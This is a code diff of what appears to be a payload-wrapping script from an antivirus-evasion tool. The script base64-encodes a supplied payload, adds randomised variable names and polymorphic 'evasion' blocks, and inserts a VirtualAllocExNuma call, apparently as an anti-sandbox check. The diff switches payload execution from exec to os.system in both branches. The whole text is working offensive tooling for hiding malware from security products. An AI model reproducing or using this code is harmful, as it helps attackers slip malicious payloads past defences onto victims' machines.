@@ -31,8 +31,7 @@ Pytherpreter = sys.argv[1]
 Filename = sys.argv[2] 
 wine = sys.argv[3]
 
-Pytherpreter.replace("import base64,sys;exec","")
-Pytherpreter= "exec(base64.b64decode(\"" + base64.b64encode(Pytherpreter) + "\"))\n"
+Pytherpreter= "base64.b64decode(\"" + base64.b64encode(Pytherpreter) + "\")\n"
 
 Randptr = usefull.varname_creator()
 Randbytesnumb = str(random.randint(1000,9999))
@@ -53,6 +52,7 @@ MorphEvasion1 = str(usefull.python_poly_multipath(a,"1"))
 MorphEvasion2 = str(usefull.python_poly_multipath(b,"2"))
 MorphEvasion3 = str(usefull.python_poly_multipath(c,"3"))
 
+
 Hollow_code = ""
 
 if wine == "True":
@@ -64,16 +64,15 @@ if wine == "True":
     Hollow_code += MorphEvasion3
     Hollow_code += "            " + Randptr + " = ctypes.windll.kernel32.VirtualAllocExNuma(ctypes.windll.kernel32.GetCurrentProcess(),ctypes.c_int(0)," + Randbytesnumb + ",ctypes.c_int(0x00001000|0x00002000),ctypes.c_int(0x40),0)\n"
     Hollow_code += "            if " + Randptr + " != ctypes.c_int(0):\n" 
-    Hollow_code += "                " + Pytherpreter + "\n"
+    Hollow_code += "                os.system(" + Pytherpreter + ")\n"
     Hollow_code = Hollow_code.encode('utf-8') 
 
 else:
-
     Hollow_code += "import base64,sys;\n"
     Hollow_code += MorphEvasion1
     Hollow_code += MorphEvasion2
     Hollow_code += MorphEvasion3 
-    Hollow_code += "           " + Pytherpreter + "\n"
+    Hollow_code += "           os.system(" + Pytherpreter + ")\n"
     Hollow_code = Hollow_code.encode('utf-8') 
 
 with open(Filename,'wb') as f:
